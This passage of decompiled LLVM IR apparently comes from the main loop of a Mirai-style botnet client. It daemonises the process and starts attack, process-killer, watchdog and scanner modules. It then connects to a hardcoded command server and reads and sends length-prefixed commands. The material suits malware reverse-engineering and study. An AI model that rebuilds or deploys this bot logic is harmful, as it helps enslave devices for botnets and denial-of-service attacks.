  %v1_dd04 = add i32 %v0_dd04, 4
  %v2_dd04 = inttoptr i32 %v1_dd04 to i32*
  %v3_dd04 = load i32, i32* %v2_dd04, align 4
  store i32 %v2_dba8, i32* @r0, align 4
  %v2_dd0c = bitcast i32* %stack_var_-152 to i8*
  %v3_dd0c = call i32 @util_strcpy(i8* %v2_dd0c, i32 %v3_dd04)
  %v0_dd10 = load i32, i32* @r8, align 4
  %v1_dd10 = add i32 %v0_dd10, 4
  %v2_dd10 = inttoptr i32 %v1_dd10 to i32*
  %v3_dd10 = load i32, i32* %v2_dd10, align 4
  %v1_dd18 = inttoptr i32 %v3_dd10 to i8*
  %v2_dd18 = call i32 @util_strlen(i8* %v1_dd18)
  store i32 %v2_dd18, i32* @r1, align 4
  store i32 %v3_dd10, i32* @r0, align 4
  %v0_dd24 = call i32 @util_zero()
  br label %dec_label_pc_dbcc

dec_label_pc_dd2c:                                ; preds = %dec_label_pc_dbcc
  %v1_dd2c = call i32 @__GI_setsid(i32 %v0_dcd4)
  %v0_dd34 = load i32, i32* @sl, align 4
  %v1_dd38 = call i32 @__GI___libc_close(i32 %v0_dd34)
  %v1_dd40 = call i32 @__GI___libc_close(i32 1)
  %v1_dd48 = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_222b0.108 to i32), i32* @fp, align 4
  %v1_dd50 = call i32 @attack_init(i32 %v1_dd48)
  %v1_dd54 = call i32 @killer_init(i32 %v1_dd50)
  %v1_dd58 = call i32 @watchdog_maintain(i32 %v1_dd54)
  %v1_dd5c = call i32 @scanner_init(i32 %v1_dd58)
  %v0_dd60 = load i32, i32* @sl, align 4
  %v2_dd64 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_dd64, i32* @r7, align 4
  %v2_dd68 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_dd68, i32* @r6, align 4
  %v2_de48 = ptrtoint i32* %stack_var_-72 to i32
  %v2_de98 = ptrtoint i32* %stack_var_-168 to i32
  %v2_e074 = ptrtoint i32* %stack_var_-56 to i32
  %v2_e07c = ptrtoint i8** %stack_var_-42 to i32
  %v2_e224 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_e098 = ptrtoint i32* %stack_var_-52 to i32
  %v1_e14c = bitcast i32* %stack_var_-152 to i8*
  %v2_e10c = ptrtoint i32* %stack_var_-88 to i32
  %v1_e128 = sub i32 0, %v1_dd2c
  br label %dec_label_pc_dd6c

dec_label_pc_dd6c:                                ; preds = %dec_label_pc_e1ac, %dec_label_pc_e248, %bb44, %dec_label_pc_e148, %dec_label_pc_df7c, %dec_label_pc_df6c, %bb41, %dec_label_pc_e29c, %dec_label_pc_e208, %dec_label_pc_e1bc, %dec_label_pc_e198, %dec_label_pc_e0c4, %dec_label_pc_dfec, %dec_label_pc_df24, %dec_label_pc_dd2c
  %stack_var_-1436.0 = phi i32 [ %v0_dd60, %dec_label_pc_dd2c ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_df6c ], [ %stack_var_-1436.1, %dec_label_pc_df7c ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_e1bc ], [ %stack_var_-1436.1, %dec_label_pc_dfec ], [ %stack_var_-1436.1, %dec_label_pc_e248 ], [ %stack_var_-1436.1, %dec_label_pc_e29c ], [ %stack_var_-1436.1, %dec_label_pc_e208 ], [ %stack_var_-1436.1, %dec_label_pc_df24 ], [ %stack_var_-1436.1, %dec_label_pc_e148 ], [ %stack_var_-1436.1, %dec_label_pc_e198 ], [ %stack_var_-1436.1, %dec_label_pc_e0c4 ], [ %stack_var_-1436.1, %dec_label_pc_e1ac ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dd78

dec_label_pc_dd78:                                ; preds = %dec_label_pc_dd78, %dec_label_pc_dd6c
  %v1_dd7c = phi i32 [ %v1_dd80, %dec_label_pc_dd78 ], [ 4, %dec_label_pc_dd6c ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_dd7c = load i32, i32* @r7, align 4
  %v3_dd7c = add i32 %v2_dd7c, %v1_dd7c
  %v4_dd7c = inttoptr i32 %v3_dd7c to i32*
  store i32 0, i32* %v4_dd7c, align 4
  %v0_dd80 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd80 = add i32 %v0_dd80, 4
  store i32 %v1_dd80, i32* %r3.global-to-local, align 4
  %v7_dd84 = icmp eq i32 %v1_dd80, 128
  br i1 %v7_dd84, label %dec_label_pc_dd8c, label %dec_label_pc_dd78

dec_label_pc_dd8c:                                ; preds = %dec_label_pc_dd78
  %v0_dd8c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dd8c, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dd94

dec_label_pc_dd94:                                ; preds = %dec_label_pc_dd94, %dec_label_pc_dd8c
  %v1_dd98 = phi i32 [ %v1_dd9c, %dec_label_pc_dd94 ], [ 4, %dec_label_pc_dd8c ]
  store i32 0, i32* @r4, align 4
  %v2_dd98 = load i32, i32* @r6, align 4
  %v3_dd98 = add i32 %v2_dd98, %v1_dd98
  %v4_dd98 = inttoptr i32 %v3_dd98 to i32*
  store i32 0, i32* %v4_dd98, align 4
  %v0_dd9c = load i32, i32* %r3.global-to-local, align 4
  %v1_dd9c = add i32 %v0_dd9c, 4
  store i32 %v1_dd9c, i32* %r3.global-to-local, align 4
  %v7_dda0 = icmp eq i32 %v1_dd9c, 128
  br i1 %v7_dda0, label %dec_label_pc_dda8, label %dec_label_pc_dd94

dec_label_pc_dda8:                                ; preds = %dec_label_pc_dd94
  store i32 ptrtoint (i32* @global_var_222ac.88 to i32), i32* %r3.global-to-local, align 4
  %v2_ddac = load i32, i32* @global_var_222ac.88, align 4
  %v7_ddb0 = icmp eq i32 %v2_ddac, -1
  br i1 %v7_ddb0, label %dec_label_pc_dddc, label %dec_label_pc_ddb8

dec_label_pc_ddb8:                                ; preds = %dec_label_pc_dda8
  %v3_ddb8 = udiv i32 %v2_ddac, 32
  %v3_ddbc = mul nuw nsw i32 %v3_ddb8, 4
  store i32 %v2_dc0c, i32* %ip.global-to-local, align 4
  %v2_ddc4 = add i32 %v3_ddbc, %v2_dc0c
  store i32 %v2_ddc4, i32* %r3.global-to-local, align 4
  %v1_ddc8 = add i32 %v2_ddc4, -240
  %v2_ddc8 = inttoptr i32 %v1_ddc8 to i32*
  %v3_ddc8 = load i32, i32* %v2_ddc8, align 4
  %v1_ddcc = urem i32 %v2_ddac, 32
  %v7_ddd4 = shl i32 1, %v1_ddcc
  %v8_ddd4 = or i32 %v3_ddc8, %v7_ddd4
  store i32 %v8_ddd4, i32* %r2.global-to-local, align 4
  store i32 %v8_ddd4, i32* %v2_ddc8, align 4
  br label %dec_label_pc_dddc

dec_label_pc_dddc:                                ; preds = %dec_label_pc_dda8, %dec_label_pc_ddb8
  %v2_dddc = load i32, i32* @global_var_222b0.108, align 4
  store i32 %v2_dddc, i32* @r3, align 4
  %v7_dde0 = icmp eq i32 %v2_dddc, -1
  store i32 ptrtoint (i32* @global_var_222b0.108 to i32), i32* @r8, align 4
  br i1 %v7_dde0, label %dec_label_pc_e004, label %dec_label_pc_ddec

dec_label_pc_ddec:                                ; preds = %dec_label_pc_e004, %dec_label_pc_dddc, %bb43
  %v2_ddf0 = load i8, i8* bitcast (i8** @global_var_22430.111 to i8*), align 4
  %v2_ddf4 = icmp eq i8 %v2_ddf0, 0
  %v2_df40 = load i32, i32* @global_var_222b0.108, align 4
  store i32 %v2_df40, i32* %ip.global-to-local, align 4
  %v3_df44 = udiv i32 %v2_df40, 32
  store i32 %v3_df44, i32* %r3.global-to-local, align 4
  br i1 %v2_ddf4, label %dec_label_pc_df40, label %dec_label_pc_ddfc

dec_label_pc_ddfc:                                ; preds = %dec_label_pc_ddec
  %v3_de08 = mul nuw nsw i32 %v3_df44, 4
  %v2_de0c = add i32 %v3_de08, %v2_dc0c
  store i32 %v2_de0c, i32* %r3.global-to-local, align 4
  %v1_de10 = add i32 %v2_de0c, -368
  %v2_de10 = inttoptr i32 %v1_de10 to i32*
  %v3_de10 = load i32, i32* %v2_de10, align 4
  %v1_de14 = urem i32 %v2_df40, 32
  %v7_de1c = shl i32 1, %v1_de14
  %v8_de1c = or i32 %v3_de10, %v7_de1c
  store i32 %v8_de1c, i32* %r2.global-to-local, align 4
  store i32 %v8_de1c, i32* %v2_de10, align 4
  br label %dec_label_pc_de24

dec_label_pc_de24:                                ; preds = %dec_label_pc_df40, %dec_label_pc_ddfc
  store i32 ptrtoint (i32* @global_var_222ac.88 to i32), i32* %r3.global-to-local, align 4
  %v2_de28 = load i32, i32* @global_var_222ac.88, align 4
  store i32 0, i32* @lr, align 4
  %v0_de30 = load i32, i32* %ip.global-to-local, align 4
  %v5_de34 = icmp slt i32 %v0_de30, %v2_de28
  br i1 %v5_de34, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_de24
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_de24, %bb
  %v0_de44 = phi i32 [ %v2_de28, %dec_label_pc_de24 ], [ %v0_de30, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_de44 = add i32 %v0_de44, 1
  store i32 %v2_de48, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dd68, i32* %r2.global-to-local, align 4
  %v5_de60 = call i32 @__libc_select(i32 %v1_de44, i32 %v2_dd64, i32 %v2_dd68, i32 0, i32 %v2_de48)
  %v8_de64 = icmp eq i32 %v5_de60, -1
  br i1 %v8_de64, label %dec_label_pc_dd6c, label %dec_label_pc_de6c

dec_label_pc_de6c:                                ; preds = %bb41
  %v6_de60 = trunc i32 %v5_de60 to i16
  %v3_de6c = icmp eq i16 %v6_de60, 0
  br i1 %v3_de6c, label %dec_label_pc_de74, label %dec_label_pc_dea8

dec_label_pc_de74:                                ; preds = %dec_label_pc_de6c
  %v5_de80 = srem i32 %stack_var_-1436.0, 6
  %v4_de88 = sub i32 %stack_var_-1436.0, %v5_de80
  store i32 %v4_de88, i32* %r3.global-to-local, align 4
  %v2_de90 = icmp eq i32 %v5_de80, 0
  %v1_de94 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_de94, i32* @lr, align 4
  store i32 %v2_de98, i32* %r2.global-to-local, align 4
  %v7_de9c = inttoptr i32 %v5_de60 to i8*
  store i8* %v7_de9c, i8** %stack_var_-42, align 4
  br i1 %v2_de90, label %dec_label_pc_e074, label %dec_label_pc_dea8

dec_label_pc_dea8:                                ; preds = %dec_label_pc_de6c, %dec_label_pc_de74, %dec_label_pc_e074
  %stack_var_-1436.1 = phi i32 [ %v1_de94, %dec_label_pc_e074 ], [ %v1_de94, %dec_label_pc_de74 ], [ %stack_var_-1436.0, %dec_label_pc_de6c ]
  store i32 ptrtoint (i32* @global_var_222ac.88 to i32), i32* %r3.global-to-local, align 4
  %v2_deac = load i32, i32* @global_var_222ac.88, align 4
  %v7_deb0 = icmp eq i32 %v2_deac, -1
  br i1 %v7_deb0, label %dec_label_pc_dedc, label %dec_label_pc_deb8

dec_label_pc_deb8:                                ; preds = %dec_label_pc_dea8
  %v3_deb8 = udiv i32 %v2_deac, 32
  %v3_debc = mul nuw nsw i32 %v3_deb8, 4
  store i32 %v2_dc0c, i32* %ip.global-to-local, align 4
  %v2_dec4 = add i32 %v3_debc, %v2_dc0c
  store i32 %v2_dec4, i32* %r3.global-to-local, align 4
  %v1_dec8 = add i32 %v2_dec4, -240
  %v2_dec8 = inttoptr i32 %v1_dec8 to i32*
  %v3_dec8 = load i32, i32* %v2_dec8, align 4
  %v1_decc = urem i32 %v2_deac, 32
  %v6_ded0 = ashr i32 %v3_dec8, %v1_decc
  store i32 %v6_ded0, i32* %r2.global-to-local, align 4
  %v1_ded4 = urem i32 %v6_ded0, 2
  %v2_ded4 = icmp eq i32 %v1_ded4, 0
  br i1 %v2_ded4, label %dec_label_pc_dedc, label %dec_label_pc_e100

dec_label_pc_dedc:                                ; preds = %dec_label_pc_deb8, %dec_label_pc_dea8
  %v2_dee0 = load i8, i8* bitcast (i8** @global_var_22430.111 to i8*), align 4
  %v3_dee0 = zext i8 %v2_dee0 to i32
  store i32 %v3_dee0, i32* @r4, align 4
  %v2_dee4 = icmp eq i8 %v2_dee0, 0
  %v2_df6c = load i32, i32* @global_var_222b0.108, align 4
  br i1 %v2_dee4, label %dec_label_pc_df6c, label %dec_label_pc_deec

dec_label_pc_deec:                                ; preds = %dec_label_pc_dedc
  %v3_def0 = udiv i32 %v2_df6c, 32
  store i32 %v2_dc0c, i32* %r2.global-to-local, align 4
  %v3_def8 = mul nuw nsw i32 %v3_def0, 4
  %v2_defc = add i32 %v3_def8, %v2_dc0c
  store i32 %v2_defc, i32* %r3.global-to-local, align 4
  %v1_df00 = add i32 %v2_defc, -368
  %v2_df00 = inttoptr i32 %v1_df00 to i32*
  %v3_df00 = load i32, i32* %v2_df00, align 4
  %v1_df04 = urem i32 %v2_df6c, 32
  %v6_df08 = ashr i32 %v3_df00, %v1_df04
  store i32 %v6_df08, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22430.111 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_df14 = urem i32 %v6_df08, 2
  %v2_df14 = icmp eq i32 %v1_df14, 0
  store i8 0, i8* bitcast (i8** @global_var_22430.111 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_222b0.108 to i32), i32* @r5, align 4
  br i1 %v2_df14, label %dec_label_pc_df24, label %dec_label_pc_e090

dec_label_pc_df24:                                ; preds = %dec_label_pc_deec
  store i32 57132, i32* @lr, align 4
  %v1_df28 = icmp ne i32 %v2_df6c, -1
  call void @__pseudo_cond_branch(i1 %v1_df28, i32 ptrtoint (i32* @global_var_14a60.113 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_df30 = load i32, i32* @r5, align 4
  %v2_df30 = inttoptr i32 %v1_df30 to i32*
  store i32 -1, i32* %v2_df30, align 4
  %v1_df38 = call i32 @sleep(i32 1)
  br label %dec_label_pc_dd6c

dec_label_pc_df40:                                ; preds = %dec_label_pc_ddec
  store i32 %v2_dc0c, i32* %r2.global-to-local, align 4
  %v3_df4c = mul nuw nsw i32 %v3_df44, 4
  %v2_df50 = add i32 %v3_df4c, %v2_dc0c
  store i32 %v2_df50, i32* %r3.global-to-local, align 4
  %v1_df54 = add i32 %v2_df50, -240
  %v2_df54 = inttoptr i32 %v1_df54 to i32*
  %v3_df54 = load i32, i32* %v2_df54, align 4
  %v1_df58 = urem i32 %v2_df40, 32
  %v7_df60 = shl i32 1, %v1_df58
  %v8_df60 = or i32 %v3_df54, %v7_df60
  store i32 %v8_df60, i32* %r2.global-to-local, align 4
  store i32 %v8_df60, i32* %v2_df54, align 4
  br label %dec_label_pc_de24

dec_label_pc_df6c:                                ; preds = %dec_label_pc_dedc
  %v7_df70 = icmp eq i32 %v2_df6c, -1
  store i32 ptrtoint (i32* @global_var_222b0.108 to i32), i32* @r8, align 4
  br i1 %v7_df70, label %dec_label_pc_dd6c, label %dec_label_pc_df7c

dec_label_pc_df7c:                                ; preds = %dec_label_pc_df6c
  %v3_df7c = udiv i32 %v2_df6c, 32
  store i32 %v2_dc0c, i32* %r2.global-to-local, align 4
  %v3_df84 = mul nuw nsw i32 %v3_df7c, 4
  %v2_df88 = add i32 %v3_df84, %v2_dc0c
  store i32 %v2_df88, i32* %r3.global-to-local, align 4
  %v1_df8c = add i32 %v2_df88, -240
  %v2_df8c = inttoptr i32 %v1_df8c to i32*
  %v3_df8c = load i32, i32* %v2_df8c, align 4
  %v1_df90 = urem i32 %v2_df6c, 32
  %v6_df94 = ashr i32 %v3_df8c, %v1_df90
  store i32 %v6_df94, i32* %r2.global-to-local, align 4
  %v1_df98 = urem i32 %v6_df94, 2
  %v2_df98 = icmp eq i32 %v1_df98, 0
  br i1 %v2_df98, label %dec_label_pc_dd6c, label %dec_label_pc_dfa0

dec_label_pc_dfa0:                                ; preds = %dec_label_pc_df7c
  %v6_dfa4 = inttoptr i32 %v3_dee0 to i8*
  store i8* %v6_dfa4, i8** %stack_var_-42, align 4
  store i32 %v2_e07c, i32* @sl, align 4
  %v0_dfa8 = call i32 @__GI___errno_location()
  %v0_dfac = load i32, i32* @r4, align 4
  %v2_dfac = inttoptr i32 %v0_dfa8 to i32*
  store i32 %v0_dfac, i32* %v2_dfac, align 4
  store i32 %v0_dfa8, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dfbc = load i32, i32* @global_var_222b0.108, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dfc8 = call i32 @__libc_recv(i32 %v2_dfbc, i32 %v2_e07c, i32 2, i32 16386)
  %v7_dfcc = icmp eq i32 %v4_dfc8, -1
  br i1 %v7_dfcc, label %dec_label_pc_e1ac, label %dec_label_pc_dfd4

dec_label_pc_dfd4:                                ; preds = %dec_label_pc_dfa0
  %v2_dfd4 = icmp eq i32 %v4_dfc8, 0
  br i1 %v2_dfd4, label %dec_label_pc_e1bc, label %dec_label_pc_dfdc

dec_label_pc_dfdc:                                ; preds = %dec_label_pc_dfd4
  store i32 %v2_de98, i32* %ip.global-to-local, align 4
  %v3_dfe0 = load i8*, i8** %stack_var_-42, align 4
  %v4_dfe0 = ptrtoint i8* %v3_dfe0 to i32
  store i32 %v4_dfe0, i32* %r3.global-to-local, align 4
  %v2_dfe4 = icmp eq i8* %v3_dfe0, null
  br i1 %v2_dfe4, label %dec_label_pc_dfec, label %dec_label_pc_e1ec

dec_label_pc_dfec:                                ; preds = %dec_label_pc_dfdc
  %v2_dfec = load i32, i32* @global_var_222b0.108, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_dff8 = add i32 %v4_dfe0, 16384
  store i32 %v1_dff8, i32* %r3.global-to-local, align 4
  %v4_dffc = call i32 @__libc_recv(i32 %v2_dfec, i32 %v2_e07c, i32 2, i32 %v1_dff8)
  br label %dec_label_pc_dd6c

dec_label_pc_e004:                                ; preds = %dec_label_pc_dddc
  %v0_e00c = load i32, i32* @r4, align 4
  store i32 %v0_e00c, i32* %r2.global-to-local, align 4
  %v3_e010 = call i32 @socket(i32 2, i32 1, i32 %v0_e00c)
  %v7_e014 = icmp eq i32 %v3_e010, -1
  store i32 %v3_e010, i32* @r5, align 4
  %v1_e01c = load i32, i32* @r8, align 4
  %v2_e01c = inttoptr i32 %v1_e01c to i32*
  store i32 %v3_e010, i32* %v2_e01c, align 4
  br i1 %v7_e014, label %dec_label_pc_ddec, label %dec_label_pc_e024

dec_label_pc_e024:                                ; preds = %dec_label_pc_e004
  %v0_e024 = load i32, i32* @r4, align 4
  store i32 %v0_e024, i32* @r2, align 4
  %v2_e02c = call i32 @__libc_fcntl(i32 %v3_e010, i32 3)
  %v1_e034 = or i32 %v2_e02c, 2048
  store i32 %v1_e034, i32* @r2, align 4
  %v0_e038 = load i32, i32* @r5, align 4
  %v2_e03c = call i32 @__libc_fcntl(i32 %v0_e038, i32 4)
  %v2_e044 = load i32, i32* @global_var_222b4.86, align 4
  store i32 %v2_e044, i32* %r3.global-to-local, align 4
  %v2_e048 = icmp eq i32 %v2_e044, 0
  br i1 %v2_e048, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_e024
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_e024, %bb42
  %v2_e050 = xor i1 %v2_e048, true
  call void @__pseudo_cond_branch(i1 %v2_e050, i32 ptrtoint (i32* @global_var_10e20.114 to i32))
  store i32 ptrtoint (i8** @global_var_22430.111 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_e05c = load i32, i32* @global_var_222b0.108, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_22430.111 to i8*), align 4
  %v4_e06c = call i32 @__libc_connect(i32 %v2_e05c, i32 ptrtoint (i16** @global_var_24f4c.93 to i32), i32 16)
  br label %dec_label_pc_ddec

dec_label_pc_e074:                                ; preds = %dec_label_pc_de74
  %v2_e078 = load i32, i32* @global_var_222b0.108, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e088 = call i32 @__libc_send(i32 %v2_e078, i32 %v2_e07c, i32 2, i32 16384)
  br label %dec_label_pc_dea8

dec_label_pc_e090:                                ; preds = %dec_label_pc_deec
  store i32 4, i32* @r4, align 4
  store i32 %v2_e098, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_e074, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_e0b4 = call i32 @getsockopt(i32 %v2_df6c, i32 1, i32 4, i32 %v2_e098, i32 %v2_e074)
  %v3_e0b8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_e0b8, i32* %r3.global-to-local, align 4
  %v2_e0bc = icmp eq i32 %v3_e0b8, 0
  br i1 %v2_e0bc, label %dec_label_pc_e148, label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e090
  %v2_e0c4 = load i32, i32* @global_var_222b0.108, align 4
  %v1_e0c8 = call i32 @__GI___libc_close(i32 %v2_e0c4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e0d0 = load i32, i32* @r5, align 4
  %v2_e0d0 = inttoptr i32 %v1_e0d0 to i32*
  store i32 -1, i32* %v2_e0d0, align 4
  %v0_e0d4 = call i32 @rand_next()
  %v3_e0dc = zext i32 %v0_e0d4 to i64
  %v4_e0dc = mul nuw i64 %v3_e0dc, 3435973837
  %v7_e0dc = trunc i64 %v4_e0dc to i32
  store i32 %v7_e0dc, i32* %ip.global-to-local, align 4
  %v3_e0e02 = udiv i64 %v4_e0dc, 34359738368
  %v3_e0e44 = mul nuw nsw i64 %v3_e0e02, 8
  %v3_e0e4 = trunc i64 %v3_e0e44 to i32
  store i32 %v3_e0e4, i32* %r2.global-to-local, align 4
  %v2_e0e86 = mul nuw nsw i64 %v3_e0e02, 2
  %v2_e0e8 = trunc i64 %v2_e0e86 to i32
  %v2_e0ec = add i32 %v3_e0e4, %v2_e0e8
  store i32 %v2_e0ec, i32* %r3.global-to-local, align 4
  %v2_e0f0 = sub i32 %v0_e0d4, %v2_e0ec
  %v1_e0f4 = add i32 %v2_e0f0, 1
  %v1_e0f8 = call i32 @sleep(i32 %v1_e0f4)
  br label %dec_label_pc_dd6c

dec_label_pc_e100:                                ; preds = %dec_label_pc_deb8
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_e098, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_e114 = call i32 @__libc_accept(i32 %v2_deac, i32 %v2_e10c, i32 %v2_e098, i32 16, i32 16)
  %v1_e118 = call i32 @scanner_kill(i32 %v5_e114)
  %v1_e11c = call i32 @killer_kill(i32 %v1_e118)
  %v2_e12c = call i32 @kill(i32 %v1_e128, i32 9)
  store i32 ptrtoint (i32* @global_var_2242c.97 to i32), i32* %r3.global-to-local, align 4
  %v2_e134 = load i32, i32* @global_var_2242c.97, align 4
  %v2_e138 = icmp eq i32 %v2_e134, 0
  br i1 %v2_e138, label %dec_label_pc_e140, label %dec_label_pc_e1e0

dec_label_pc_e140:                                ; preds = %dec_label_pc_e100, %dec_label_pc_e1e0
  %v1_e144 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_e148

dec_label_pc_e148:                                ; preds = %dec_label_pc_e090, %dec_label_pc_e140
  %v2_e14c = call i32 @util_strlen(i8* %v1_e14c)
  %sext = mul i32 %v2_e14c, 16777216
  %v1_e150 = sdiv i32 %sext, 16777216
  %v7_e150 = inttoptr i32 %v1_e150 to i8*
  store i8* %v7_e150, i8** %stack_var_-42, align 4
  %v0_e154 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_24f40.59 to i32), i32* @lr, align 4
  %v0_e15c = load i32, i32* @r4, align 4
  store i32 %v0_e15c, i32* %r2.global-to-local, align 4
  store i32 %v0_e154, i32* @global_var_24f40.59, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e16c = load i32, i32* @r5, align 4
  %v1_e16c = inttoptr i32 %v0_e16c to i32*
  %v2_e16c = load i32, i32* %v1_e16c, align 4
  %v4_e170 = call i32 @__libc_send(i32 %v2_e16c, i32 ptrtoint (i32* @global_var_19a80.118 to i32), i32 %v0_e15c, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_e17c = load i32, i32* @r5, align 4
  %v1_e17c = inttoptr i32 %v0_e17c to i32*
  %v2_e17c = load i32, i32* %v1_e17c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e188 = call i32 @__libc_send(i32 %v2_e17c, i32 %v2_e07c, i32 1, i32 16384)
  %v3_e18c = load i8*, i8** %stack_var_-42, align 4
  %v4_e18c = ptrtoint i8* %v3_e18c to i32
  store i32 %v4_e18c, i32* %r2.global-to-local, align 4
  %v3_e190 = icmp eq i8* %v3_e18c, null
  br i1 %v3_e190, label %dec_label_pc_dd6c, label %dec_label_pc_e198

dec_label_pc_e198:                                ; preds = %dec_label_pc_e148
  %v0_e198 = load i32, i32* @r5, align 4
  %v1_e198 = inttoptr i32 %v0_e198 to i32*
  %v2_e198 = load i32, i32* %v1_e198, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e1a4 = call i32 @__libc_send(i32 %v2_e198, i32 %v2_dba8, i32 %v4_e18c, i32 16384)
  br label %dec_label_pc_dd6c

dec_label_pc_e1ac:                                ; preds = %dec_label_pc_e21c, %dec_label_pc_dfa0
  %v0_e1ac = load i32, i32* @r5, align 4
  %v1_e1ac = inttoptr i32 %v0_e1ac to i32*
  %v2_e1ac = load i32, i32* %v1_e1ac, align 4
  store i32 %v2_e1ac, i32* %r3.global-to-local, align 4
  %v7_e1b0 = icmp eq i32 %v2_e1ac, 4
  br i1 %v7_e1b0, label %dec_label_pc_dd6c, label %bb44

bb44:                                             ; preds = %dec_label_pc_e1ac
  %v8_e1b4 = icmp eq i32 %v2_e1ac, 11
  br i1 %v8_e1b4, label %dec_label_pc_dd6c, label %dec_label_pc_e1bc

dec_label_pc_e1bc:                                ; preds = %dec_label_pc_e240, %bb44, %dec_label_pc_dfd4
  %v2_e1bc = load i32, i32* @global_var_222b0.108, align 4
  store i32 57800, i32* @lr, align 4
  %v1_e1c4 = icmp ne i32 %v2_e1bc, -1
  call void @__pseudo_cond_branch(i1 %v1_e1c4, i32 ptrtoint (i32* @global_var_14a60.113 to i32))
  store i32 ptrtoint (i32* @global_var_222b0.108 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_222b0.108, align 4
  %v1_e1d8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_dd6c

dec_label_pc_e1e0:                                ; preds = %dec_label_pc_e100
  %v2_e1e4 = call i32 @kill(i32 %v2_e134, i32 9)
  br label %dec_label_pc_e140

dec_label_pc_e1ec:                                ; preds = %dec_label_pc_dfdc
  %v3_e1ec = udiv i32 %v4_dfe0, 256
  %v1_e1f0 = urem i32 %v4_dfe0, 256
  store i32 %v1_e1f0, i32* %r3.global-to-local, align 4
  %v4_e1f4 = mul nuw nsw i32 %v1_e1f0, 256
  %v5_e1f4 = or i32 %v4_e1f4, %v3_e1ec
  %v6_e1f4 = trunc i32 %v5_e1f4 to i16
  store i32 %v5_e1f4, i32* %r2.global-to-local, align 4
  store i32 %v2_de98, i32* @lr, align 4
  %v7_e200 = inttoptr i32 %v5_e1f4 to i8*
  store i8* %v7_e200, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_e1f4, 1025
  br i1 %tmp45, label %dec_label_pc_e21c, label %dec_label_pc_e208

dec_label_pc_e208:                                ; preds = %dec_label_pc_e1ec
  %v2_e208 = load i32, i32* @global_var_222b0.108, align 4
  %v1_e20c = call i32 @__GI___libc_close(i32 %v2_e208)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e214 = load i32, i32* @r8, align 4
  %v2_e214 = inttoptr i32 %v1_e214 to i32*
  store i32 -1, i32* %v2_e214, align 4
  br label %dec_label_pc_dd6c

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e1ec
  %v0_e21c = load i32, i32* @r4, align 4
  %v1_e21c = load i32, i32* @r5, align 4
  %v2_e21c = inttoptr i32 %v1_e21c to i32*
  store i32 %v0_e21c, i32* %v2_e21c, align 4
  store i32 %v2_e224, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e22c = load i32, i32* @global_var_222b0.108, align 4
  %v7_e234 = call i32 @__libc_recv(i32 %v2_e22c, i32 %v2_e224, i32 %v5_e1f4, i32 16386)
  %v7_e238 = icmp eq i32 %v7_e234, -1
  br i1 %v7_e238, label %dec_label_pc_e1ac, label %dec_label_pc_e240

dec_label_pc_e240:                                ; preds = %dec_label_pc_e21c
  %v2_e240 = icmp eq i32 %v7_e234, 0
  br i1 %v2_e240, label %dec_label_pc_e1bc, label %dec_label_pc_e248

dec_label_pc_e248:                                ; preds = %dec_label_pc_e240
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_e254 = load i32, i32* @global_var_222b0.108, align 4
  %v4_e258 = call i32 @__libc_recv(i32 %v2_e254, i32 %v2_e07c, i32 2, i32 16384)
